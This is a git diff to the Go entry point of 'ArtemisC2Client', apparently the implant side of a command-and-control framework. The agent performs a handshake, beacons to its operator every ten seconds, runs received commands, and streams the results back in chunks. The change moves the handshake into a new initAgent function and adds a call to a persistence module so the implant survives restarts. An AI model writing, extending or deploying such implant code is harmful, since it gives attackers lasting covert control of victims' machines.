@@ -11,6 +11,7 @@ import (
 	"github.com/desertcod98/ArtemisC2Client/dns"
 	"github.com/desertcod98/ArtemisC2Client/encoding"
 	"github.com/desertcod98/ArtemisC2Client/log"
+	"github.com/desertcod98/ArtemisC2Client/persistence"
 	"github.com/desertcod98/ArtemisC2Client/utils"
 )
 
@@ -18,14 +19,11 @@ func main() {
 	cfg, configErr := config.LoadConfig()
 
 	if configErr != nil {
-		agentId, handshakeErr := doHandshake()
-		if handshakeErr != nil {
-			log.Log("Handshake error:", handshakeErr)
+		err := initAgent(cfg)
+		if err != nil{
+			log.Log(err.Error())
 			return
 		}
-		cfg.AgentId = agentId
-		cfg.BeaconInterval = 10 // seconds
-		config.SaveConfig(cfg)
 	}
 
 	ctx := initContext(cfg)
@@ -110,7 +108,7 @@ func collectAndSendResult(cmd commands.Command, commandArgs []string, job string
 func collectAndSendStreamResult(cmd commands.StreamCommand, commandArgs []string, job string) {
 	stream, totalBytes, closer := cmd.Execute(commandArgs)
 	if closer != nil {
-			defer closer.Close()
+		defer closer.Close()
 	}
 	transfer := chunkedtransfer.NewTransfer(job, stream, uint64(totalBytes))
 	transfer.Send()
@@ -121,4 +119,19 @@ func initContext(cfg *config.Config) *config.Context {
 		Config:              cfg,
 		SetBeaconIntervalCh: make(chan int, 1),
 	}
+}
+
+func initAgent(cfg *config.Config) error {
+	agentId, handshakeErr := doHandshake()
+	if handshakeErr != nil {
+		log.Log("Handshake error:", handshakeErr)
+		return handshakeErr
+	}
+	cfg.AgentId = agentId
+	cfg.BeaconInterval = 10 // seconds
+	config.SaveConfig(cfg)
+
+	persistence.TryInit()
+
+	return nil
 }
